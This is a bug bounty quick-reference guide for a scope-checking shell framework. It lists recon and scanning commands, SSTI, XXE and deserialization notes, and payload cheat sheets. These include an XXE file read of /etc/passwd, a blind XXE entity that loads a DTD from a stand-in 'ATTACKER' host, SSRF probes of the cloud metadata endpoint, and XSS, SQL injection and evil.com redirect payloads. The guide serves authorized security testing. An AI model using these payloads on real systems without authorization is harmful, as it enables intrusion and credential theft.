# Bug Bounty Quick Reference Guide

## 🚀 Quick Start

```bash
# 0. Create/update the program scope (once per program)
./bugbounty-hunter.sh new program-name
# -> edit ../programs/program-name.md with the real scope from HackerOne

# 1. Verify that the target is in scope before touching anything
./bugbounty-hunter.sh scope example.com

# 1.5 Verify that your local DNS is not hijacking/blocking the domain
#     (common in gambling/adult/streaming niches — ISPs redirect to a
#     warning page instead of resolving the actual site)
./bugbounty-hunter.sh resolve example.com

# Full pipeline
./bugbounty-hunter.sh full example.com

# Recon only
./bugbounty-hunter.sh recon example.com

# View platforms
./bugbounty-hunter.sh platforms
```

All active phases (`recon`, `vuln`, `brute`, `secrets`, `api`, `full`)
automatically verify the scope against `../programs/*.md` and abort if the
target is not documented or is marked as *Out of Scope*.

---

## 🎯 5-Phase Methodology

### Phase 1: Reconnaissance
```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com >> subdomains.txt

# HTTP probing
httpx -l subdomains.txt -o live.txt

# Wayback URLs
echo "target.com" | gau > wayback.txt
waybackurls target.com >> wayback.txt

# JS endpoints
katana -u "https://target.com" -d 3 -jc -o js_endpoints.txt
```

### Phase 2: Scanning
```bash
# Nuclei - Vulnerability scanner
echo "https://target.com" | nuclei -severity critical,high

# CORS testing
nuclei -u "https://target.com" -t nuclei-templates/http/misconfiguration/cors*

# XSS detection
dalfox url "https://target.com/?param=test"

# SQL injection
sqlmap -u "https://target.com/?id=1" --batch --level=1
```

### Phase 3: Fuzzing
```bash
# Directory fuzzing
feroxbuster -u "https://target.com" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

# Parameter fuzzing
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# VHost fuzzing
ffuf -u "https://target.com" -H "Host: FUZZ.target.com" -w subdomains.txt
```

### Phase 4: Exploitation
```bash
# SSRF testing
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"

# IDOR testing
# Change IDs in URLs: /user/123 → /user/124

# Open redirect
# Test parameters: ?next=, ?redirect=, ?url=, ?return=
```

### Phase 5: Reporting
```bash
# Generate report
./bugbounty-hunter.sh report example.com
```

---

## 🏆 Vulnerability Types (by bounty)

### Critical ($5,000+)
- Remote Code Execution (RCE)
- SQL Injection with data access
- Authentication bypass
- Server-side Request Forgery (SSRF) → Internal access
- Deserialization vulnerabilities

### High ($1,000-$5,000)
- Stored XSS
- IDOR with access to sensitive data
- CSRF on critical actions
- Open redirect → Account takeover
- SSRF (without internal access)

### Medium ($500-$1,000)
- Reflected XSS
- CSRF on non-critical actions
- Information disclosure
- Missing rate limiting
- Session fixation

### Low ($100-$500)
- Version disclosure
- Missing security headers
- Verbose error messages
- Clickjacking
- Open redirect (without impact)

---

## 🧪 Technique Deep-Dives

Four modern web classes worth a dedicated detection pass — each one shows up
regularly on live programs and is easy to miss with generic scanners.

### Server-Side Template Injection (SSTI) — CWE-1336 / CWE-94
User input reaches a template engine as *template*, not as *data*, so the
engine evaluates it. Classic path to RCE in Node (Handlebars, Pug, EJS),
Python (Jinja2, Mako), Java (Freemarker, Velocity), Ruby (ERB).

```bash
# 1. Detect: send polyglot math/marker probes in every reflected field
#    (names, search, subject, profile bio, filenames, CSV/PDF export fields)
#    ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  {7*7}
#    A reflected "49" (not "7*7") = the engine evaluated it → SSTI.
# 2. Fingerprint the engine (49 vs error vs {{7*7}} unchanged) then escalate.
```
- **Handlebars (Node)** is a frequent real-world case (e.g. CVE-2026-33937, AST
  injection → RCE in 4.0.0–4.7.8): a crafted template abuses the compiler's AST
  to reach `require`/`process` and execute commands.
- Where to look: anything that renders user data into emails, PDFs, reports,
  dashboards, or "preview" features — those paths often skip autoescaping.

### XML External Entity (XXE) — CWE-611
An XML parser with external-entity resolution enabled reads local files or
makes server-side requests (SSRF) from attacker-supplied XML.

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

<!-- Blind/OOB (exfil via external DTD when no reflection) -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://ATTACKER/evil.dtd"> %p;]>
```
- Where to look: any endpoint accepting XML — SAML (`SAMLResponse`), SOAP/WSDL
  services, SVG/DOCX/XLSX uploads (Office files are ZIP+XML), RSS/sitemap
  importers, `Content-Type: application/xml` or `text/xml` APIs.
- Escalates to file disclosure, SSRF→IMDS (AWS creds), and sometimes RCE.

### Insecure postMessage — CWE-345 / CWE-346
A page's `message` listener trusts cross-origin input because it never
validates `event.origin` (or validates with loose `indexOf`/`includes`). The
message data then drives an authenticated action, a `fetch`, or a DOM sink.

```javascript
// Vulnerable pattern to grep for in the app's JS bundles:
window.addEventListener("message", (e) => {
  // no strict e.origin check...
  fetch("/api/do", { method: "POST", credentials: "include",
                     body: e.data });   // attacker-controlled request w/ victim cookies
});
```
- Detect: grep bundles for `addEventListener("message"` / `onmessage`; check
  whether `e.origin` is compared with `===` against an allowlist, and where
  `e.data` flows (fetch/XHR → authorized-request-on-behalf-of-victim; innerHTML
  → DOM XSS; location → open redirect). Burp **DOM Invader** automates this.
- Impact: fully-authorized HTTP requests on behalf of the victim, ATO.

### Insecure Deserialization — CWE-502
Untrusted serialized data is deserialized into live objects → RCE.

```bash
# Python pickle: pickle.loads() on user input = RCE.
# A malicious object defines __reduce__ -> (os.system, ("cmd",)).
# Signature of a pickle blob: starts with \x80 (base64 often begins "gAS...").
```
- Where to look: session cookies/tokens that base64-decode to a pickle
  (`gAS...`), cache layers (Redis/Memcached storing pickles), task queues
  (Celery), and **ML model files** — `.pkl`, `joblib`, and PyTorch `.pt` all use
  pickle underneath, so "upload a model" features are a prime RCE vector
  (MLflow-class issues). Java (`ac ed 00 05` / `rO0` base64), PHP (`O:` object
  strings), Ruby, and .NET have the equivalent primitive.
- Always one of the highest-paid classes when reachable (Critical/RCE).

---

## 🛠️ Essential Tools

### Reconnaissance
| Tool | Use |
|-------------|-----|
| subfinder | Subdomain enumeration |
| amass | OSINT enumeration |
| httpx | HTTP probing |
| waybackurls | Wayback Machine URLs |
| gau | URL fetcher |
| katana | Web crawler |

### Vulnerability Scanning
| Tool | Use |
|-------------|-----|
| nuclei | Template-based scanning |
| dalfox | XSS scanner |
| sqlmap | SQL injection |
| ffuf | Web fuzzer |
| feroxbuster | Directory brute |

### Exploitation
| Tool | Use |
|-------------|-----|
| curl | HTTP requests |
| wget | File download |
| python | Scripting |
| Burp Suite | HTTP proxy |

---

## 📋 Security Checklist

### HTTP Headers
- [ ] Strict-Transport-Security
- [ ] X-Content-Type-Options
- [ ] X-Frame-Options
- [ ] Content-Security-Policy
- [ ] X-XSS-Protection
- [ ] Referrer-Policy
- [ ] Permissions-Policy

### Cookies
- [ ] HttpOnly flag
- [ ] Secure flag
- [ ] SameSite attribute
- [ ] Path restriction
- [ ] Expiration

### Authentication
- [ ] Rate limiting
- [ ] Account lockout
- [ ] Password policy
- [ ] MFA support
- [ ] Session management

---

## 🎯 Dorking Queries

### Google Dorks
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak
site:target.com inurl:api
```

### GitHub Dorks
```
"target.com" password
"target.com" api_key
"target.com" secret
"target.com" credentials
filename:config.php target.com
```

---

## 🔐 Encoding Bypass Techniques

### Base64 Encoding
```bash
# Encode payload
echo -n 'etc/passwd' | base64
# Result: ZXRjL3Bhc3N3ZA==

# Decode
echo 'ZXRjL3Bhc3N3ZA==' | base64 -d
```

### Common Payloads
| Original | Base64 |
|----------|--------|
| `/etc/passwd` | `L2V0Yy9wYXNzd2Q=` |
| `/etc/shadow` | `L2V0Yy9zaGFkb3c=` |
| `../../etc/passwd` | `Li4vLi4vLi4vZXRjL3Bhc3N3ZA==` |

### Use in Attacks
```
# LFI Bypass
url/?f=L2V0Yy9wYXNzd2Q=        # /etc/passwd encoded

# SQL Injection Bypass
' OR 1=1 -- => JyBPUiAxPTEgLS0=

# XSS Bypass
<script>alert(1)</script> => PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### URL Encoding
```bash
# Encode
python3 -c 'import urllib.parse; print(urllib.parse.quote("<script>"))'
# Result: %3Cscript%3E

# Double encoding
python3 -c 'import urllib.parse; print(urllib.parse.quote("%3Cscript%3E"))'
# Result: %253Cscript%253E
```

### Unicode Encoding
```
< = \u003C
> = \u003E
' = \u0027
" = \u0022
```

### HTML Entity Encoding
```
< = &#60; or &#x3C;
> = &#62; or &#x3E;
' = &#39; or &#x27;
" = &#34; or &#x22;
```

### Mixed Encoding Attacks
```
# SQL Injection
' OR 1=1 --
=> %27%20OR%201%3D1%20--
=> %27%20%4F%52%201%3D1%20--

# XSS
<script>alert(1)</script>
=> %3Cscript%3Ealert(1)%3C/script%3E
=> &#60;script&#62;alert(1)&#60;/script&#62;

# LFI
../../etc/passwd
=> ..%2F..%2F..%2Fetc%2Fpasswd
=> ....//....//....//etc/passwd
```

---

## 📝 Payload Templates

### XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### SQL Injection
```
' OR 1=1 --
' UNION SELECT NULL--
1' AND '1'='1
admin'--
```

### SSRF
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080
http://[::1]
http://0177.0.0.1
```

### Open Redirect
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?next=https://evil.com
https://target.com/redirect?return=https://evil.com
```

---

## 🏅 Related Certifications

- **OSCP** - OffSec Certified Professional
- **CEH** - Certified Ethical Hacker
- **OSWE** - OffSec Web Expert
- **BSCP** - Burp Suite Certified Practitioner
- **eWPT** - Web Application Penetration Tester

---

## 📚 Learning Resources

### Platforms
- [TryHackMe](https://tryhackme.com) - Learning paths
- [HackTheBox](https://hackthebox.com) - Machines
- [PortSwigger](https://portswigger.net/web-security) - Web security
- [PicoCTF](https://picoctf.org) - CTF challenges

### Blogs
- [PortSwigger Research](https://portswigger.net/research)
- [Google Project Zero](https://googleprojectzero.blogspot.com)
- [Orange Tsai](https://blog.orange.tw)
- [Corben Leo](https://corben.io)

---

*dev101x — Bug Bounty Framework*
